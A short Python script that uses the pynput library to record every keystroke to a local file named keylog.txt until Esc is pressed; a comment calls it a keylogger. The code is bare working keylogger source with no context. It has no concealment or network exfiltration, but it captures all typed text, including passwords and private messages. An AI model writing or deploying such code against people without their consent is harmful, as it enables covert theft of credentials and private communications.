from pynput import keyboard

# Path to the log file
LOG_FILE = "keylog.txt"

# Function to write keys to the log file
def on_press(key):
    with open(LOG_FILE, "a") as log_file:
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f" {key} ")  # For special keys like Shift, Enter, etc.

# Function to handle key release
def on_release(key):
    # Stops the keylogger if the Esc key is pressed
    if key == keyboard.Key.esc:
        return False

# Listener setup
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
